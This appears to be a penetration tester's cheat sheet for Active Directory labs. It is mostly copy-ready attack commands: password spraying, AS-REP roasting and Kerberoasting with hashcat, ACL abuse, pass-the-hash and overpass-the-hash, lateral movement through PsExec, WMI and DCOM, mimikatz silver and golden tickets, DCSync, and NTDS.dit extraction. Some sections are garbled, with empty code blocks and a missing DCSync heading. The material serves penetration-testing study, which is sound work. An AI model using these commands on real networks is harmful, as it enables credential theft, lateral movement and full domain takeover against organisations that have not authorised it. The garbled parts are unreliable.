## Core Mindset

In Active Directory labs, do not think in isolated techniques.

Think in this loop:

```
Enumerate
↓
Find relationship / weakness
↓
Exploit or validate safely
↓
Gain new user / host / privilege
↓
Re-enumerate from the new context
↓
Repeat
```

Every new credential, host, session, group membership, ticket, or hash changes what you can see and do.

> [!important]  
> Re-enumerate after every new user or host compromise. AD permissions are perspective-dependent.

## Try Password Spraying

LDAP / ADSI spray:

```
.\Spray-Passwords.ps1 -Pass <password>
```

Include admins if allowed:

```
.\Spray-Passwords.ps1 -Pass <password> -Admin
```

Kerberos spray:

```
.\kerbrute_windows_amd64.exe passwordspray -d <domain> .\usernames.txt "<password>"
```

SMB spray:

```
crackmapexec smb <target_ip> -u users.txt -p '<password>' -d <domain> --continue-on-success
```

Decision:

```
If spray finds valid creds:
    validate carefully
    enumerate as that user
    check local admin access
    check shares
    check BloodHound paths

If CME shows Pwn3d:
    user is local admin on target
    consider lateral movement
```

# 5. If You Find a User with Pre-Auth Disabled

This means:

```
Do not require Kerberos preauthentication
```

Try:

```
AS-REP Roasting
```

## Kali

```
impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast <domain>/<user>
```

Crack:

```
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Windows

```
.\Rubeus.exe asreproast /nowrap
```

PowerView check:

```
Get-DomainUser -PreauthNotRequired
```

Decision:

```
If AS-REP hash cracks:
    validate creds
    enumerate as cracked user
    check groups, shares, local admin, sessions

If no users have pre-auth disabled:
    check ACLs
    if GenericWrite or GenericAll over a user:
        targeted AS-REP roasting may be possible
```

# 6. If You Find User Accounts with SPNs

SPN-bearing user accounts are Kerberoasting targets.

Find SPNs:

```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

Or:

```
setspn -L <account>
```

Try:

```
Kerberoasting
```

## Windows

```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Crack:

```
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Kali

```
impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<user>
```

Decision:

```
If service account password cracks:
    validate account
    enumerate groups
    check local admin access
    check service access
    check whether password is reused

If account is gMSA, MSA, computer account, or krbtgt:
    cracking is usually infeasible

If you have GenericWrite or GenericAll over a user:
    targeted Kerberoasting may be possible by adding an SPN
```

# 8. If You Find ACL Rights

Interesting rights:

```
GenericAll
GenericWrite
WriteOwner
WriteDACL
AllExtendedRights
ForceChangePassword
Self / Self-Membership
```

Check ACLs:

```
Get-ObjectAcl -Identity "<target>"
```

Convert SIDs:

```
Convert-SidToName <SID>
```

Find GenericAll on a group:

```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

Decision:

```
If GenericAll over group:
    you may be able to add yourself to the group

If GenericAll or GenericWrite over user:
    targeted Kerberoasting may be possible
    targeted AS-REP Roasting may be possible
    password reset may be possible but noisy

If WriteDACL:
    you may be able to grant yourself stronger rights

If WriteOwner:
    you may be able to take ownership, then modify DACL
```

Group add example:

```
net group "Management Department" <user> /add /domain
```

Cleanup:

```
net group "Management Department" <user> /del /domain
```

# 11. If You Have Local Admin on a Host

You can consider:

```
WMI
WinRM
PsExec
DCOM
Pass the Hash
credential dumping
ticket extraction
```

## Choose Lateral Movement Method

### If SMB and ADMIN$ are available

Try PsExec:

```
.\PsExec64.exe -i \\<target> -u <domain\user> -p <password> cmd
```

### If you have an NTLM hash and NTLM is accepted

Try Pass the Hash:

```
impacket-wmiexec -hashes :<ntlm_hash> <user>@<target_ip>
```

### If WinRM is open

Try WinRS:

```
winrs -r:<target> -u:<user> -p:<password> "cmd /c hostname & whoami"
```

PowerShell Remoting:

```
New-PSSession -ComputerName <target> -Credential $credential
Enter-PSSession <id>
```

### If WMI/RPC is open

Try WMI:

```
wmic /node:<target_ip> /user:<user> /password:<password> process call create "cmd"
```

PowerShell CIM:

```
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command}
```

### If DCOM/RPC is open

Try DCOM MMC:

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target_ip>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

# 12. Lateral Movement Decision Table

|Finding|Try|
|---|---|
|Plaintext password + local admin|PsExec, WinRM, WMI, DCOM|
|NTLM hash + local admin|Pass the Hash|
|NTLM hash but need Kerberos|Overpass the Hash|
|Kerberos ticket available|Pass the Ticket|
|Service account hash + target SPN|Silver Ticket|
|krbtgt hash|Golden Ticket|
|Domain Admin or replication rights|DCSync|
|DA on DC|Shadow Copy / NTDS.dit extraction|
|User has WinRM rights|WinRS / PowerShell Remoting|
|User has local admin on host with privileged session|Dump creds/tickets|
|User has SPN|Kerberoast|
|User has pre-auth disabled|AS-REP Roast|

# 14. If You Have an NTLM Hash

Ask:

```
Is the target using NTLM?
Do I have local admin on target?
Do I need Kerberos instead?
```

## Pass the Hash

Use when:

```
target accepts NTLM
SMB reachable
account has local admin
```

```
impacket-wmiexec -hashes :<ntlm_hash> <domain>/<user>@<target_ip>
```

## Overpass the Hash

Use when:

```
you have NTLM hash
you want Kerberos tickets
tool does not accept hashes
target expects Kerberos
```

```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell
```

Trigger Kerberos:

```
net use \\<hostname>
```

Confirm:

```
klist
```

Then use Kerberos-aware access:

```
PsExec.exe \\<hostname> cmd.exe
```

> [!tip]  
> Use hostnames for Kerberos. IP addresses often force NTLM.

# 15. If You Have Kerberos Tickets

List tickets:

```
klist
```

If tickets are in LSASS and you can extract:

```
sekurlsa::tickets /export
```

Inject ticket:

```
kerberos::ptt <ticket.kirbi>
```

Decision:

```
If ticket is krbtgt:
    it is a TGT

If ticket is cifs/host:
    use it for SMB/file access to that host

If ticket is http/host:
    use it for web service access

If ticket is ldap/dc:
    use it for LDAP/DC-related access
```

Example:

```
dave@cifs-web04.kirbi
```

Use for:

```
ls \\web04\backup
```

# 16. If You Have Service Account Hash + SPN

This may enable:

```
Silver Ticket
```

Required:

```
service account NTLM hash
domain SID
target SPN
domain name
user to impersonate
```

Example:

```
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<target_fqdn> /service:<service> /rc4:<service_hash> /user:<user>
```

Use when:

```
you have the hash for the account that owns the SPN
you want access to that specific service
PAC validation is not enforced
```

Remember:

```
Silver Ticket = service-specific
```

```

```

Required rights:

```
Replicating Directory Changes

Replicating Directory Changes in Filtered Set
```

Usually held by:

```
Domain Admins
Enterprise Admins

```
lsadump::dcsync /user:<domain>\<user>

```
lsadump::dcsync /user:corp\dave

## Impacket

```

```

Decision:

```
If DCSync works:
    extract target hashes
    crack or reuse hashes
    consider krbtgt only if explicitly in scope
```

High-value targets:

```
Administrator
krbtgt
Domain Admin users
service accounts

# 18. If You Compromise krbtgt

This enables:

```
Golden Ticket
```

Required:

```
krbtgt NTLM hash
domain SID
domain name
existing username
```

Create ticket:

```
kerberos::golden /user:<existing_user> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt
```

Use hostname-based access:

```
PsExec.exe \\dc1 cmd.exe
```

Do not use IP if you need Kerberos:

```
PsExec.exe \\192.168.50.70 cmd.exe
```

Decision:

```
If Golden Ticket works:
    full domain compromise is likely
    document carefully
    treat krbtgt as critical evidence
```

# 19. If You Have DA on the Domain Controller

You may be able to extract the AD database.

Technique:

```
Shadow Copy / NTDS.dit extraction
```

Create Shadow Copy:

```
vshadow.exe -nw -p C:
```

Copy NTDS:

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit c:\ntds.dit.bak
```

Save SYSTEM hive:

```
reg.exe save hklm\system c:\system.bak
```

On Kali:

```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

Decision:

```
If successful:
    you have domain hashes and Kerberos keys
    krbtgt hash may enable Golden Tickets
    user hashes may enable PtH or cracking
```

# 20. BloodHound / SharpHound Usage

Use when allowed and when manual enumeration becomes complex.

Collect:

```
Invoke-BloodHound -CollectionMethod All -OutputDirectory <path> -OutputPrefix "<prefix>"
```

Then analyze:

```
Shortest Paths to Domain Admins
Shortest Paths from Owned Principals
Sessions
Local Admin
ACLs
SPNs
Group memberships
```

Decision:

```
If BloodHound shows AdminTo:
    check local admin path

If BloodHound shows HasSession:
    see if you can access that host

If BloodHound shows GenericAll/GenericWrite:
    consider ACL abuse, targeted roasting, group modification

If BloodHound shows Kerberoastable user:
    Kerberoast

If BloodHound shows AS-REP roastable user:
    AS-REP roast
```

Mark owned:

```
current user
current host
newly compromised users
newly compromised hosts
```

# 23. Avoid Common Mistakes

## Do Not Skip Password Policy

Before spraying:

```
net accounts
```

---

## Do Not Use IPs When You Need Kerberos

Bad for Kerberos:

```
PsExec.exe \\192.168.50.70 cmd.exe
```

Better:

```
PsExec.exe \\dc1 cmd.exe
```

---

## Do Not Trust whoami Alone After Ticket Attacks

`whoami` checks the local token.

For Kerberos attacks, also check:

```
klist
```

And validate access to the target service.

---

## Do Not Forget Cleanup

If you modify AD:

```
remove added group members
remove added SPNs
restore UAC values
document changes
```

---

## Do Not Stop After One New Credential

Every new credential means:

```
new LDAP view
new shares
new local admin checks
new BloodHound paths
new possible sessions
```

# 24. Minimal “What Should I Try Next?” Flow

```
Have domain creds?
    → Enumerate users/groups/computers/shares/SPNs/ACLs

Find password candidate?
    → Check lockout policy
    → Spray carefully

Find pre-auth disabled user?
    → AS-REP roast

Find SPN on user?
    → Kerberoast

Crack password?
    → Validate
    → Re-enumerate
    → Check local admin

Find local admin on host?
    → Check logged-on users
    → Lateral movement
    → Dump creds/tickets if in scope

Find privileged session?
    → Dump LSASS or export tickets

Get NTLM hash?
    → PtH if NTLM target
    → Overpass if Kerberos needed
    → Crack offline

Get Kerberos ticket?
    → Pass the Ticket to matching service

Get service account hash?
    → Silver Ticket for matching SPN

Get DA or replication rights?
    → DCSync

Get krbtgt?
    → Golden Ticket

Get DA on DC?
    → Shadow Copy NTDS extraction
```

# 25. Key Takeaways

- AD exploitation is a loop: enumerate, exploit, re-enumerate.
- New credentials are new visibility.
- New local admin rights mean possible lateral movement and credential access.
- New tickets/hashes mean alternate authentication paths.
- SPNs suggest Kerberoasting.
- Pre-auth disabled users suggest AS-REP Roasting.
- ACL rights often create privilege escalation paths.
- Sessions matter because credentials and tickets live in memory.
- Hostnames matter for Kerberos.
- DCSync and Golden Tickets indicate severe domain compromise.
- Always map each finding to a technique, then validate carefully.
